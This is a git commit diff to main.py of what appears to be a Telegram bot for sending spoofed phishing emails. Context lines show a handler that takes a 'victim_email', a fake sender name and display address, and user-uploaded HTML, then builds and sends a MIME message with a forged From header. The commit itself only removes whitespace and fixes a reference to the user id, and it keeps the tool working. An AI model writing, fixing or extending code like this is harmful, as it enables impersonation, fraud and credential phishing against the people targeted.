a089bfca2d6e20f690ef8819a2fe259a3d592b29
Matthew Redfox <153170004+MDHtrappy@users.noreply.github.com>
2025-02-03 16:24:46 +0100

    fixed custom

--- main.py
+++ main.py
@@ -290,17 +290,17 @@ async def get_custom_html(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
         file = await update.message.document.get_file()
         html_content = await file.download_as_bytearray()
 
-      
+
         context.user_data["html_content"] = html_content.decode("utf-8")
 
-  
+
         victim_email = context.user_data["victim_email"]
         subject = context.user_data["subject"]
         sender_name = context.user_data["sender_name"]
         display_email = context.user_data["display_email"]
         html_body = context.user_data["html_content"]
 
-  
+
         msg = MIMEMultipart("related")
         msg["Subject"] = subject
         msg["From"] = f"{sender_name} <{display_email}>"
@@ -314,13 +314,13 @@ async def get_custom_html(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
                 subject,
                 msg,
                 victim_email,
-                context.effective_user.id
+                update.effective_user.id
             )
             await update.message.reply_text("Custom email sent successfully!")
         except Exception as e:
             await update.message.reply_text(f"Failed to send email: {str(e)}")
 
-   
+
         context.user_data.clear()
         return ConversationHandler.END
     else:
